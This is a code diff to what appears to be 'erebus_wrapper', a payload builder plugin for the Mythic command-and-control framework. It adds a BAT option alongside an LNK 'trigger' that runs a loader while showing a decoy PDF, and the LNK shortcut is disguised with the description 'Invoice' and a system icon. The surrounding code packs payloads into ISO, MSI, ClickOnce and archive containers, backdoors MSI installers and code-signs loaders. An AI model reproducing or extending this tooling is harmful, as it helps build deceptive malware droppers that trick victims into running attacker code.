@@ -12,6 +12,7 @@ from erebus_wrapper.erebus.modules.payload_dll_proxy import generate_proxies
 from erebus_wrapper.erebus.modules.container_clickonce import build_clickonce
 from erebus_wrapper.erebus.modules.container_msi import build_msi, hijack_msi
 from erebus_wrapper.erebus.modules.trigger_lnk import create_payload_trigger
+from erebus_wrapper.erebus.modules.trigger_bat import create_bat_payload_trigger
 from erebus_wrapper.erebus.modules.container_archive import build_7z, build_zip
 from erebus_wrapper.erebus.modules.container_iso import build_iso
 from erebus_wrapper.erebus.modules.codesigner import self_sign_payload, get_remote_cert_details, sign_with_provided_cert
@@ -521,7 +522,15 @@ generated if none have been entered.""",
                 HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
                 HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Provide Certificate")
             ]
-        )
+        ),
+        BuildParameter(
+            name="7.0 Trigger Type",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Type of Trigger to toggle decoy and execution",
+            choices=["LNK", "BAT"],
+            default_value="LNK",
+            required=False,
+        ),
     ]
 
     build_steps = [
@@ -633,7 +642,7 @@ generated if none have been entered.""",
             ))
             raise RuntimeError(f"MSI backdooring failed: {str(e)}")
 
-    async def containerise_payload(self):
+    async def containerise_payload(self,agent_build_path):
         """Creates a container and adds all files generated from the payload function inside of the given archive/media"""
 
         match(self.get_parameter("3.0 Container Type")):
@@ -1454,46 +1463,61 @@ generated if none have been entered.""",
                         StepSuccess=True
                     ))
             ######################### End of Decoy Section #########################
-            ######################### LNK Trigger Section #########################
+            ######################### Trigger Generation Section #########################
             if self.get_parameter("0.0 Main Payload Type") == "Loader":
+                
+                payload_dir = Path(agent_build_path) / "payload"
+                decoy_dir = Path(agent_build_path) / "decoys"
+                decoy_file = decoy_dir / "decoy.pdf"
+
+                trigger_type = self.get_parameter("7.0 Trigger Type")
+
                 try:
-                    payload_dir = Path(agent_build_path) / "payload"
-                    decoy_dir = Path(agent_build_path) / "decoys"
-                    decoy_file = decoy_dir / "decoy.pdf"
-                    
-                    # Create LNK trigger file
-                    lnk_path = create_payload_trigger(
-                        target_bin = str(self.get_parameter("0.8 Trigger Binary")),
-                        args = str(self.get_parameter("0.9 Trigger Command")),
-                        icon_src = r"C:\Windows\System32\imageres.dll",
-                        icon_index = 0,
-                        description = "Invoice",
-                        payload_dir = payload_dir,
-                        decoy_file = decoy_file
-                    )
-                    
-                    response.status = BuildStatus.Success
-                    response.build_message = "LNK Trigger created!"
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="Adding Trigger",
-                        StepStdout=f"LNK Trigger created at: {lnk_path}",
-                        StepSuccess=True,
-                    ))
+                    trigger_path = ""
+
+                    match trigger_type:
+                        case "LNK":
+                            trigger_path = create_payload_trigger(
+                                target_bin=str(self.get_parameter("0.8 Trigger Binary")),
+                                args=str(self.get_parameter("0.9 Trigger Command")),
+                                icon_src=r"C:\\Windows\\System32\\imageres.dll",
+                                icon_index=0,
+                                description="Invoice",
+                                payload_dir=payload_dir,
+                                decoy_file=decoy_file
+                            )
+
+                        case "BAT":
+                            trigger_path = create_bat_payload_trigger(
+                                payload_exe="erebus.exe",
+                                payload_dir=payload_dir,
+                                decoy_file=decoy_file
+                            )
+
+                    if trigger_path:
+                        response.status = BuildStatus.Success
+                        response.build_message = f"{trigger_type} Trigger created!"
+                        
+                        await SendMythicRPCPayloadUpdatebuildStep(
+                            MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Adding Trigger",
+                            StepStdout=f"{trigger_type} Trigger created at: {trigger_path}",
+                            StepSuccess=True,
+                        ))
+
                 except Exception as e:
                     response.status = BuildStatus.Error
-                    response.build_message = f"Failed to create LNK trigger: {str(e)}"
+                    response.build_message = f"Failed to create {trigger_type} trigger: {str(e)}"
                     await SendMythicRPCPayloadUpdatebuildStep(
                         MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
                         StepName="Adding Trigger",
-                        StepStdout=f"Failed to create LNK trigger: {str(e)}",
+                        StepStdout=f"CRITICAL ERROR: Failed to create {trigger_type} trigger: {str(e)}",
                         StepSuccess=False,
                     ))
                     return response
-
-            ######################### End Of  LNK Trigger Section #########################
+            ######################### End Of Trigger Generation Section #########################
             ######################### MSI Backdooring Section #########################
             
             # Backdoor MSI if user uploaded one (adds backdoored MSI to payload directory)
@@ -1512,7 +1536,7 @@ generated if none have been entered.""",
             self.agent_build_path = agent_build_path
 
             # 2. Attempt Containerization
-            container_path = await self.containerise_payload()
+            container_path = await self.containerise_payload(agent_build_path)
 
             if container_path:
                 # Case A: Container created (7z/MSI)
